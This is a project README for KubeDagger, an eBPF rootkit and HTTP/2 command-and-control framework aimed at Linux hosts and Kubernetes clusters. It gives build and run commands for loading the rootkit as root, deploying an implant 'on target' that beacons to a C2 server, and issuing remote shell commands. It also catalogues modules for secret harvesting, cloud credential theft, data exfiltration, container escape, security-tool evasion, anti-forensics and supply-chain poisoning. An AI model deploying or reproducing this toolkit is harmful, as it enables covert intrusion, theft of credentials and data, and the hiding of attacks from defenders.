# KubeDagger

<p align="center">
  <img src="https://github.com/yasindce1998/KubeDagger/blob/master/logo/logo-removebg-preview.png?raw=true" alt="KubeDagger"/>
</p>

[![License: GPL v2](https://img.shields.io/badge/License-GPL%20v2-blue.svg)](https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html)
[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)

An eBPF-based security research tool with a cross-platform HTTP/2 C2 framework. Demonstrates 57+ offensive techniques including network discovery, file system monitoring, process hiding, container breakouts, cloud-native attacks, kernel-level covert channels, eBPF polymorphism, and autonomous objective planning. Supports Linux (eBPF kernel-level), Windows, and macOS (userspace agent).

## Disclaimer

This project is provided for **educational purposes only**. Do not use these tools to violate the law. The author is not responsible for any illegal action. Misuse of the provided information can result in criminal charges.

## Architecture

```
┌─────────────────────┐       HTTP/2 (mTLS)       ┌──────────────────────┐
│   C2 Server         │◄─────────────────────────►│   Agent              │
│ (kubedagger-server) │  cert-pinned, TLS 1.3     │ (kubedagger-agent)   │
│                     │                            │                      │
│ - Agent registry    │  POST /checkin (beacon)    │ - Shell executor     │
│ - Task queue (FIFO) │  POST /task    (dispatch)  │ - Module system      │
│ - Mgmt port (9443)  │  POST /result  (output)   │ - Cross-platform     │
└─────────────────────┘                            └──────────────────────┘
         ▲
         │ ChaCha20-Poly1305 encrypted TCP
         ▼
┌─────────────────────┐
│   Operator CLI       │
│ (kubedagger-operator)│
│                      │
│ - agents / shell     │
│ - module / tasks     │
│ - status             │
└──────────────────────┘
```

**Binaries:**

| Binary | Description | Platform |
|--------|-------------|----------|
| `kubedagger` | eBPF rootkit daemon (loads kernel probes) | Linux only |
| `kubedagger-client` | CLI for interacting with the eBPF daemon | Linux only |
| `kubedagger-server` | HTTP/2 C2 server with mTLS + management port | Linux, macOS |
| `kubedagger-agent` | Cross-platform implant (beacon + modules) | Linux, Windows, macOS |
| `kubedagger-operator` | Operator CLI for managing agents/tasks | Linux, Windows, macOS |
| `webapp` | Web-based control panel | Linux |

## Requirements

**eBPF components (Linux only):**
- Linux kernel 5.4+ with eBPF support (BTF-enabled for CO-RE portability)
- Kernel headers installed in `/lib/modules/$(uname -r)`
- clang & llvm 11+
- Root privileges

**C2 components (cross-platform):**
- Go 1.25+
- No kernel dependencies

## Build

```shell
# Build everything (eBPF + all binaries)
make

# Build only the C2 server
make build-server

# Build cross-platform agents (linux/amd64, windows/amd64, darwin/arm64)
make build-agent

# Build operator CLI
make build-operator

# Install client to /usr/bin/
make install_client
```

## Quick Start

### eBPF Mode (Linux)

```shell
# Check prerequisites
./scripts/check-prereqs.sh

# Build and start the eBPF server (requires root)
make rootkit
sudo ./bin/kubedagger -i eth0 -e eth0

# Use the client
kubedagger-client -h
```

### C2 Mode (Cross-Platform)

```shell
# Generate encryption key for management port
KEY=$(kubedagger-client c2 genkey)

# Start the C2 server
./bin/kubedagger-server -key $KEY -plaintext

# Deploy agent on target (use --plaintext for dev, mTLS for production)
./bin/kubedagger-agent-linux -server http://10.0.2.5:443 -plaintext

# Interact via operator CLI
./bin/kubedagger-operator -key $KEY agents
./bin/kubedagger-operator -key $KEY shell <agent-id> whoami
./bin/kubedagger-operator -key $KEY module <agent-id> k8s_discovery
```

> **For full usage instructions, see [USAGE.md](USAGE.md)**

### Advanced Engine Packages

| Package | Description |
|---------|-------------|
| `pkg/covert` | Kernel-level covert channels (ICMP, DNS, TCP retransmit, TTL steganography) |
| `pkg/polymorph` | eBPF bytecode polymorphism engine for signature evasion |
| `pkg/k8sc2` | Kubernetes API C2 channel via ConfigMap annotations |
| `pkg/memexec` | Memory-only execution (memfd_create, /proc/pid/mem, process hollowing) |
| `pkg/webhook` | Admission webhook weaponization with auto-cert and Pod injection |
| `pkg/antiforensics` | Anti-forensics eBPF hooks (audit suppression, log filtering, timestomping) |
| `pkg/autonomy` | Autonomous objective engine with rule-based forward-chaining planner |

### Available client commands

| Command | Description |
|---------|-------------|
| `dashboard` | Real-time TUI dashboard |
| `docker` | Docker image override configuration |
| `dns_exfil` | DNS-based data exfiltration |
| `fs_watch` | File system watches |
| `k8s discover` | Kubernetes cluster discovery |
| `k8s abuse` | Kubernetes privilege escalation |
| `escape` | Container escape (privileged, socket, cgroup, nsenter) |
| `secrets harvest` | Harvest secrets from env, K8s, cloud, Docker, Vault |
| `evasion` | Runtime security evasion (Falco, Tetragon, KubeArmor) |
| `netbypass` | Network policy bypass (tunnel, spoof, encap, direct) |
| `meshbypass` | Service mesh bypass (XDP, UID, raw, exclude) |
| `obs-poison` | Observability poisoning (Prometheus, OTel, StatsD) |
| `cloud meta` | Cloud metadata credential theft (AWS, GCP, Azure) |
| `cloud exfil` | Data exfiltration to cloud storage |
| `webhook` | Admission webhook backdoor deployment |
| `cri-tamper` | CRI-level image tampering (containerd, CRI-O) |
| `daemonset` | DaemonSet dropper for cluster-wide deployment |
| `keyring` | Kernel keyring theft |
| `tls-intercept` | TLS traffic interception |
| `etcd-steal` | Etcd credential theft |
| `log-tamper` | Log tampering |
| `syscall-bypass` | Syscall-level hiding |
| `audit-filter` | Audit log filtering |
| `pcap-blind` | Pcap blinding |
| `coredump-suppress` | Core dump suppression |
| `timeskew` | Timestamp manipulation |
| `polymorph` | BPF polymorphism |
| `fileless-exec` | Fileless execution |
| `xdp-shell` | XDP reverse shell |
| `bpf-ipc` | BPF map IPC |
| `k8s-event-c2` | K8s Event C2 |
| `container-log-c2` | Container log C2 |
| `tcp-stego` | TCP window steganography |
| `doh-c2` | DNS-over-HTTPS C2 |
| `covert-channel` | Covert channels |
| `arp-spoof` | ARP cache poisoning |
| `kubelet` | Kubelet API abuse |
| `veth-hijack` | Veth pair hijacking |
| `sidecar-inject` | Sidecar container injection |
| `supply-chain` | Supply chain injection |
| `gitops-poison` | GitOps repository poisoning |
| `sa-token` | Service account token minting/theft |
| `pod-identity` | Pod identity theft |
| `sig-bypass` | Image signature verification bypass |
| `crd-backdoor` | CRD-based backdoor controller |
| `honeypot-detect` | Honeypot/deception detection |
| `sched-starve` | Scheduler starvation attack |
| `fault-inject` | Syscall fault injection |
| `cgroup-manip` | Cgroup resource manipulation |
| `election-disrupt` | Leader election disruption |
| `cert-sabotage` | Certificate rotation sabotage |
| `keyring-mitm` | Kernel keyring MITM |
| `mitre` | MITRE ATT&CK mapping export (37 techniques) |
| `network_discovery` | Network discovery and port scanning |
| `pipe_prog` | Piped programs configuration |
| `postgres` | PostgreSQL authentication control |
| `proctree` | Process tree visualization |

## License

- Go code: Apache 2.0
- eBPF programs: GPL v2
